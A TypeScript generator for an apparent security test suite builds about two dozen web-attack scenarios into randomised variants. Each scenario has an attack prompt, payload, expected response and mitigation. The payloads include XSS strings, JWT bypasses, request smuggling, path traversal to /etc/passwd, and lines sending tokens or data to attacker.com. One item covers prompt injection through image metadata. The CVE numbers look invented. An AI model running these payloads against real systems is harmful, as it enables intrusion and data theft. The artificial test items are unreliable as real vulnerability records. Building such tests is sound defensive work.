import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

interface ZeroDayCase {
  id: string;
  name: string;
  category: string;
  difficulty: 'critical' | 'high' | 'medium' | 'low';
  cvss: number;
  prompt: string;
  attack_vector: string;
  payload: string;
  expected_response: string;
  mitigation: string;
  year: number;
}

const ZERO_DAY_SCENARIOS: ZeroDayCase[] = [
{
  id: 'CVE-2024-0001', name: 'LLM Prompt Injection via Image', category: 'AI', difficulty: 'critical', cvss: 9.8,
  prompt: 'Exploit prompt injection via image metadata on ai-service.com',
  attack_vector: 'Crafted image with hidden prompt in EXIF',
  payload: '<?exif data="<?xml><prompt>admin bypass</prompt>"',
  expected_response: 'System should reject malicious EXIF data',
  mitigation: 'Strip all metadata before processing',
  year: 2024
},
{
  id: 'CVE-2024-0002', name: 'HTTP/2 CONTINUATION Flood', category: 'DoS', difficulty: 'high', cvss: 7.5,
  prompt: 'Perform HTTP/2 CONTINUATION flood on webserver.com',
  attack_vector: 'Send huge CONTINUATION frames without END_HEADERS',
  payload: '\x00\x00\x00\x00\x00\x00\xff\xff...',
  expected_response: 'Service should limit header size',
  mitigation: 'Implement header limits',
  year: 2024
},
{
  id: 'CVE-2024-0003', name: 'WebSocket Smuggling', category: 'Bypass', difficulty: 'critical', cvss: 8.2,
  prompt: 'Exploit WebSocket protocol smuggling on app.com/ws',
  attack_vector: 'HTTP/1.1 to HTTP/2 Upgrade bypass',
  payload: "GET /ws HTTP/1.1\r\nUpgrade: websocket\r\n\r\n",
  expected_response: 'Should reject invalid upgrade',
  mitigation: 'Strict protocol validation',
  year: 2024
},
{
  id: 'CVE-2024-0004', name: 'OAuth Token Leak via Referer', category: 'Auth', difficulty: 'high', cvss: 7.8,
  prompt: 'Exploit OAuth token leak via Referer header on oauth-provider.com',
  attack_vector: 'Malicious site triggers Referer leak',
  payload: '<img src="https://attacker.com/log?token=BEARER_TOKEN">',
  expected_response: 'Should use state parameter and referrer-policy',
  mitigation: 'Set referrer-policy: strict-origin-when-cross-origin',
  year: 2024
},
{
  id: 'CVE-2024-0005', name: 'JWT Algorithm Confusion', category: 'Auth', difficulty: 'critical', cvss: 9.1,
  prompt: 'Exploit JWT algorithm confusion on api.target.com/auth',
  attack_vector: 'Change RS256 to HS256 and sign with public key',
  payload: '{"alg":"HS256","typ":"JWT"}',
  expected_response: 'Reject algorithm switch',
  mitigation: 'Whitelist algorithms, verify key',
  year: 2024
},
{
  id: 'CVE-2024-0006', name: 'PostMessage XSS', category: 'XSS', difficulty: 'high', cvss: 7.6,
  prompt: 'Exploit PostMessage XSS on messenger.com',
  attack_vector: 'PostMessage without origin check',
  payload: 'window.parent.postMessage("<script>alert(1)</script>","*")',
  expected_response: 'Verify origin in listener',
  mitigation: 'Check origin in all event listeners',
  year: 2024
},
{
  id: 'CVE-2024-0007', name: 'WebCache Deception + Poisoning', category: 'Cache', difficulty: 'high', cvss: 7.9,
  prompt: 'Perform web cache poisoning on cdn.target.com',
  attack_vector: 'Cache key confusion with arbitrary headers',
  payload: '/test.js?__proto__=alert(1)',
  expected_response: 'Validate cache keys strictly',
  mitigation: 'Normalize headers before cache key',
  year: 2024
},
{
  id: 'CVE-2024-0008', name: 'CSS Exfiltration', category: 'Info', difficulty: 'medium', cvss: 6.5,
  prompt: 'Exfiltrate data via CSS selector on target.com/admin',
  attack_vector: 'CSS attribute selectors leak data',
  payload: 'input[name="csrf"][value^="a"] { background: url("https://attacker.com/leak?a"); }',
  expected_response: 'Sanitize user input in CSS',
  mitigation: 'Content Security Policy',
  year: 2024
},
{
  id: 'CVE-2024-0009', name: 'SAML Relay', category: 'Auth', difficulty: 'critical', cvss: 8.8,
  prompt: 'Exploit SAML assertion replay on sso.target.com',
  attack_vector: 'Replay old valid assertion',
  payload: '<Assertion ID="2024-old-valid-signature">',
  expected_response: 'Check NotBefore/NotOnOrAfter',
  mitigation: 'Verify assertion freshness',
  year: 2024
},
{
  id: 'CVE-2024-0010', name: 'HTTPUpload Path Traversal', category: 'LFI', difficulty: 'high', cvss: 7.5,
  prompt: 'Exploit path traversal in file upload on upload.target.com',
  attack_vector: '../ in filename for directory traversal',
  payload: 'filename="../../etc/passwd"',
  expected_response: 'Sanitize filename',
  mitigation: 'Strip special chars',
  year: 2024
},
{
  id: 'CVE-2024-0011', name: 'GraphQL Introspection Bypass', category: 'Info', difficulty: 'medium', cvss: 5.3,
  prompt: 'Bypass GraphQL introspectionDisable on api.target.com',
  attack_vector: 'Typename injection in query',
  payload: '{ __schema { types { name } } }',
  expected_response: 'Block introspection in prod',
  mitigation: 'Disable introspection in production',
  year: 2024
},
{
  id: 'CVE-2024-0012', name: 'WebSocket ReDoS', category: 'DoS', difficulty: 'high', cvss: 7.2,
  prompt: 'Exploit WebSocket ReDoS on ws.target.com',
  attack_vector: 'Malformed frames cause infinite loop',
  payload: '0x80 0xFF 0xFF 0xFF... (incomplete frame)',
  expected_response: 'Timeout incomplete frames',
  mitigation: 'Frame size limits',
  year: 2024
},
{
  id: 'CVE-2024-0013', name: 'JWT None Algorithm Bypass', category: 'Auth', difficulty: 'critical', cvss: 9.1,
  prompt: 'Exploit JWT "none" algorithm on api.target.com/auth',
  attack_vector: 'Set alg: "none" and remove signature',
  payload: '{"alg":"none","payload":{"user":"admin"}}',
  expected_response: 'Reject alg: none',
  mitigation: 'Never accept none algorithm',
  year: 2024
},
{
  id: 'CVE-2024-0014', name: 'Link Injection to CSRF', category: 'CSRF', difficulty: 'medium', cvss: 6.1,
  prompt: 'Exploit link injection CSRF on target.com/transfer',
  attack_vector: 'data: URL with JavaScript',
  payload: '<a href="javascript:alert(document.cookie)">Click</a>',
  expected_response: 'Scrub javascript: URLs',
  mitigation: 'Filter dangerous protocols',
  year: 2024
},
{
  id: 'CVE-2024-0015', name: 'HTTP Response Splitting', category: 'Injection', difficulty: 'critical', cvss: 8.2,
  prompt: 'Exploit HTTP response splitting on proxy.target.com',
  attack_vector: 'CRLF injection in headers',
  payload: 'GET / HTTP/1.1\r\nHost: target.com\r\n\r\nHTTP/1.1 200 OK\r\nX-Injected: yes',
  expected_response: 'Sanitize headers',
  mitigation: 'Strip CR/LF from user input',
  year: 2024
},
{
  id: 'CVE-2024-0016', name: 'DNS Rebinding (Time)', category: 'Bypass', difficulty: 'high', cvss: 7.8,
  prompt: 'Exploit DNS rebinding attack on api.target.com/validate',
  attack_vector: 'Time-based DNS change',
  payload: 'First resolve to 1.2.3.4, then to 127.0.0.1',
  expected_response: 'Use DNS pins',
  mitigation: 'DNS pinning',
  year: 2024
},
{
  id: 'CVE-2024-0017', name: 'DOM Clobbering', category: 'XSS', difficulty: 'high', cvss: 7.4,
  prompt: 'Exploit DOM clobbering on target.com/search',
  attack_vector: 'Overwrite global objects via HTML',
  payload: '<a id="user"><a id="user" name="admin">',
  expected_response: 'Check HTML id collision',
  mitigation: 'Avoid global object collision detection',
  year: 2024
},
{
  id: 'CVE-2024-0018', name: 'Service Worker Injection', category: 'XSS', difficulty: 'critical', cvss: 9.0,
  prompt: 'Inject malicious Service Worker on target.com',
  attack_vector: 'Register evil SW via XSS',
  payload: 'navigator.serviceWorker.register("/evil.js")',
  expected_response: 'Allowlist SW paths',
  mitigation: 'Restrict SW registration',
  year: 2024
},
{
  id: 'CVE-2024-0019', name: 'JSONP Callback XSS', category: 'XSS', difficulty: 'high', cvss: 7.6,
  prompt: 'Exploit JSONP callback XSS on api.target.com/jsonp',
  attack_vector: 'Callback with script tag',
  payload: '/api?callback=<script>alert(1)</script>',
  expected_response: 'Validate callback',
  mitigation: 'Regex validation on callback',
  year: 2024
},
{
  id: 'CVE-2024-0020', name: 'Edge-Side Include Injection', category: 'RCE', difficulty: 'critical', cvss: 9.8,
  prompt: 'RCE via ESI injection on edge-server.com',
  attack_vector: 'ESI tag injection',
  payload: '<esi:include src="http://attacker.com/rce"/>',
  expected_response: 'Disable ESI if not needed',
  mitigation: 'Validate ESI tags',
  year: 2024
},
{
  id: 'CVE-2024-0021', name: 'WebSocket Cross-Site Hijacking', category: 'Hijack', difficulty: 'high', cvss: 8.0,
  prompt: 'Exploit WebSocket cross-site hijacking on ws.target.com',
  attack_vector: 'WebSocket without origin check',
  payload: 'new WebSocket("ws://target.com", ["*"])',
  expected_response: 'Verify origin',
  mitigation: 'Check origin header',
  year: 2024
},
{
  id: 'CVE-2024-0022', name: 'Markdown XSS', category: 'XSS', difficulty: 'medium', cvss: 6.8,
  prompt: 'Exploit Markdown XSS on blog.target.com',
  attack_vector: 'Markdown parsed to HTML',
  payload: '[xss](javascript:alert(1))',
  expected_response: 'Sanitize Markdown output',
  mitigation: 'DOMPurify output',
  year: 2024
},
{
  id: 'CVE-2024-0023', name: 'IDOR via Race Condition', category: 'IDOR', difficulty: 'high', cvss: 7.2,
  prompt: 'Exploit IDOR via race condition on api.target.com/transfer',
  attack_vector: 'Parallel requests bypass check',
  payload: 'Send 10 transfer requests simultaneously',
  expected_response: 'Use database transactions',
  mitigation: 'Atomic operations',
  year: 2024
},
{
  id: 'CVE-2024-0024', name: 'SSRF via PDF Generation', category: 'SSRF', difficulty: 'critical', cvss: 8.8,
  prompt: 'Exploit SSRF via PDF generator on pdf.target.com',
  attack_vector: 'PDF contains external resource',
  payload: '<img src="http://internal:8080/">',
  expected_response: 'Block internal resources',
  mitigation: 'Network isolation in PDF',
  year: 2024
},
{
  id: 'CVE-2024-0025', name: 'HTTP Desync Attack', category: 'ReqSmuggling', difficulty: 'critical', cvss: 9.0,
  prompt: 'Perform HTTP request smuggling on proxy.target.com',
  attack_vector: 'CL.TE: Content-Length vs Transfer-Encoding',
  payload: 'GET / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\ntest\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n',
  expected_response: 'Normalized headers',
  mitigation: 'Request normalization',
  year: 2024
},
];

function generateVariants(base: ZeroDayCase, count: number): ZeroDayCase[] {
  const variants: ZeroDayCase[] = [];
  const variations = [
    ' (with WAF bypass)',
    ' (edge case)',
    ' (chained)',
    ' (authenticated)',
    ' (blind)',
    ' (DOM-based)',
    ' (reflected)',
    ' (stored)',
  ];
  
  for (let i = 0; i < count; i++) {
    variants.push({
      ...base,
      id: `${base.id}-V${i + 1}`,
      name: `${base.name}${variations[i % variations.length]}`,
      prompt: `${base.prompt}${variations[i % variations.length]}`,
      difficulty: (['low', 'medium', 'high', 'critical'] as const)[Math.floor(Math.random() * 4)],
      cvss: Math.min(10, base.cvss + (Math.random() - 0.5)),
    });
  }
  
  return variants;
}

function main() {
  const allCases: ZeroDayCase[] = [];
  
  console.log('🎯 Generating 0-Day & Edge Case Test Suite...\n');
  
  const targetCounts = { critical: 100, high: 150, medium: 150, low: 100 };
  
  let idCounter = 1;
  for (const base of ZERO_DAY_SCENARIOS) {
    const count = base.difficulty === 'critical' ? 50 : base.difficulty === 'high' ? 30 : 20;
    const variants = generateVariants(base, count);
    allCases.push(...variants);
    
    console.log(`  ${base.id} ${base.name}: ${variants.length} variants (${base.difficulty.toUpperCase()})`);
  }
  
  const diffCounts = { critical: 0, high: 0, medium: 0, low: 0 };
  for (const c of allCases) diffCounts[c.difficulty]++;
  
  console.log(`\n📊 Total: ${allCases.length} 0-day test cases`);
  console.log(`   Critical: ${diffCounts.critical}`);
  console.log(`   High:     ${diffCounts.high}`);
  console.log(`   Medium:   ${diffCounts.medium}`);
  console.log(`   Low:      ${diffCounts.low}`);
  
  const outputPath = path.join(__dirname, 'zeroday_cases.json');
  fs.writeFileSync(outputPath, JSON.stringify(allCases, null, 2));
  console.log(`\n💾 Saved to: ${outputPath}`);
}

main();